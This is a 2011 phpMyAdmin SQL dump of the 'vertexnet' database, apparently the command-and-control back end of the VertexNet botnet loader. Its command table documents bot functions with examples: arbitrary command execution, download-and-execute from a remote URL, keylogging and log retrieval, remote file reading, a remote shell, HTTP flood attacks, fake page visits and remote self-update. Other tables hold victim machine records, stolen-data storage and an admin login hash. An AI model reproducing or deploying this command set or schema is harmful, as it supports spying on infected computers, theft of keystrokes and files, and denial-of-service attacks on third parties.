-- phpMyAdmin SQL Dump
-- version 3.3.9
-- http://www.phpmyadmin.net
--
-- Serveur: localhost
-- Généré le : Ven 17 Juin 2011 à 21:54
-- Version du serveur: 5.1.53
-- Version de PHP: 5.3.4

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de données: `vertexnet`
--

-- --------------------------------------------------------

--
-- Structure de la table `vn_cmds`
--

CREATE TABLE IF NOT EXISTS `vn_cmds` (
  `title` varchar(255) NOT NULL,
  `displayname` varchar(55) NOT NULL,
  `desc` text NOT NULL,
  `type` varchar(25) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Contenu de la table `vn_cmds`
--

INSERT INTO `vn_cmds` (`title`, `displayname`, `desc`, `type`) VALUES
('msg::<span class="param">@Param1</span>,<span class="param">@Param2</span>,<span class="param">@Param3</span>', 'MessageBox|msg::', 'This function send a sample messagebox to the target computer(s).\r\n\r\n<span class="param">@Param1</span> : String message title\r\n<span class="param">@Param2</span> : String message core\r\n<span class="param">@Param3</span> : String message icon {NONE,WARN,ERROR,INFO,QUEST}\r\n\r\nExample : msg::DarkCoderSc,Hello world,INFO', 'Fun/debug'),
('exec::<span class="param">@Param1</span>', 'Execute Command|exec::', 'This function is the equivalent of "Execute" dialogue of windows it will run any kind of command.\r\n\r\n<span class="param">@Param1</span> : the command.\r\n\r\nExample : exec::notepad', 'system'),
('close', 'Terminate Loader Process|close', 'Close the loader of selected computer(s) ', 'Loader'),
('urldl::<span class="param">@Param1</span>,<span class="param">@Param2</span>,<span class="param">@Param3</span>', 'File Downloader|urldl::', 'Download a file in selected computer(s) in a chosen path and execute it if you decide it.\r\n\r\n<span class="param">@Param1</span> : the url of the file to download\r\n<span class="param">@Param2</span> : the file path where the url file will be dropped\r\n<span class="param">@Param3</span> : if you want to execute after download or not {true, false}\r\n\r\nExample : urldl::http://server.com/stub.exe,c:\\\\dropped.exe,true', 'Network'),
('getproc', 'Get Process List|getproc', 'This function will get process list from selected computer(s)', 'system'),
('getmodules::<span class="param">@Param1</span>', 'Get modules list|getmodules::', 'Retreive modules list from a process ID, to get a process ID simply use the command getproc and choose one.\r\n\r\n<span class="param">@Param1</span> : PID (Process ID) of target process\r\n\r\nExample : getmodules::1604', 'system'),
('setkeylogger::<span class="param">@Param1</span>', '(Un)Active Keylogger|setkeylogger::', 'This will active or unactive the keylogger\r\n\r\n<span class="param">@Param1</span> : This param take two value {true , false},\r\nif true a new thread will be create to capture strokes if false then the thread will be close.\r\n\r\nExample : setkeylogger::true', 'spy'),
('getklogs', 'Get keylogger logs|getklogs', 'This functions will retrieve the logs from selected computer(s)', 'spy'),
('readfile::<span class="param">@Param1</span>', 'Read a file|readfile::', 'This function will retrieve the content of a file in text format.\r\nif File doesn''t exists then nothing will happened.\r\n\r\n<span class="param">@Param1</span> : The full path of the target file.\r\n\r\nExample : readfile::c:\\test.txt\r\n\r\n', 'file manager'),
('uninstall', 'Uninstall loader|uninstall', 'This function will close the loader and uninstall the startup key if it was choosen in settings', 'Loader'),
('httpflood::<span class="param">@Param1</span><span class="param">@Param2</span>', 'Flood website|httpflood::', 'This function will flood a server by broken HTTP requests (multithread)\r\n\r\n<span class="param">@Param1</span> : the url web site with a www. (no HTTP://)\r\n\r\n<span class="param">@Param2</span> : the time in second of the attack 0 = unlimited.\r\n\r\nExample : httpflood::www.server.com,100', 'Security'),
('remoteshell::<span class="param">@Param1</span>', 'Remote shell|remoteshell::', 'This function will execute a Shell command and retrieve the output flux and send it to the control panel.\r\n\r\n<span class="param">@Param1</span> : the dos command.\r\n\r\nExample : remoteshell::netstat -an', 'System'),
('visitpage::<span class="param">@Param1</span>,<span class="param">@Param2</span>', 'Visit web page|visitpage::', 'This will simulate a website visit during few seconds , usefull to increments some visits counter etc.\r\n\r\n<span class="param">@Param1</span> : the URL to visit in this format Http://\r\n<span class="param">@Param2</span> : How many time the loader will visit the web page.\r\n\r\nExample : visitpage::http://darkcomet-rat.com/,5', 'Web'),
('update::<span class="param">@Param1</span>', 'Update loader|update::', 'This function will uninstall the current user and update it by downloading the new one.\r\n\r\n<span class="param">@Param1</span> : The url of your new loader.\r\n\r\nNotice : be sure to use this synthax : http://url.com/yourloader.exe.\r\n\r\nExample : update::http://helloworld.net/newvertex.exe', 'Loader');

-- --------------------------------------------------------

--
-- Structure de la table `vn_settings`
--

CREATE TABLE IF NOT EXISTS `vn_settings` (
  `id` int(11) NOT NULL,
  `usersperpage` int(11) NOT NULL,
  `username` varchar(25) NOT NULL,
  `passwd` varchar(100) NOT NULL,
  `userswidth` int(11) NOT NULL,
  `showofflines` int(1) NOT NULL,
  `usegeoip` int(1) NOT NULL,
  `usersdead` float NOT NULL,
  `showdead` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Contenu de la table `vn_settings`
--

INSERT INTO `vn_settings` (`id`, `usersperpage`, `username`, `passwd`, `userswidth`, `showofflines`, `usegeoip`, `usersdead`, `showdead`) VALUES
(1, 15, 'root', '7b24afc8bc80e548d66c4e7ff72171c5', 300, 1, 0, 4, 1);

-- --------------------------------------------------------

--
-- Structure de la table `vn_tasks`
--

CREATE TABLE IF NOT EXISTS `vn_tasks` (
  `uid` varchar(100) NOT NULL,
  `params` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `vn_tasks`
--


-- --------------------------------------------------------

--
-- Structure de la table `vn_userdata`
--

CREATE TABLE IF NOT EXISTS `vn_userdata` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` varchar(100) NOT NULL,
  `type` int(11) NOT NULL,
  `time` varchar(50) NOT NULL,
  `data` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Contenu de la table `vn_userdata`
--


-- --------------------------------------------------------

--
-- Structure de la table `vn_users`
--

CREATE TABLE IF NOT EXISTS `vn_users` (
  `lan` varchar(15) NOT NULL DEFAULT 'Unknow',
  `status` int(1) NOT NULL DEFAULT '0',
  `ip` varchar(15) NOT NULL DEFAULT 'Unknow',
  `cmpname` varchar(35) NOT NULL DEFAULT 'Unknow',
  `country` varchar(50) NOT NULL,
  `idle` int(11) NOT NULL DEFAULT '0',
  `uid` varchar(100) NOT NULL DEFAULT 'Unknow',
  `CC` varchar(3) NOT NULL DEFAULT 'XX',
  `t_on` int(11) NOT NULL,
  `version` varchar(10) NOT NULL,
  `nfdata` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`uid`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Contenu de la table `vn_users`
--

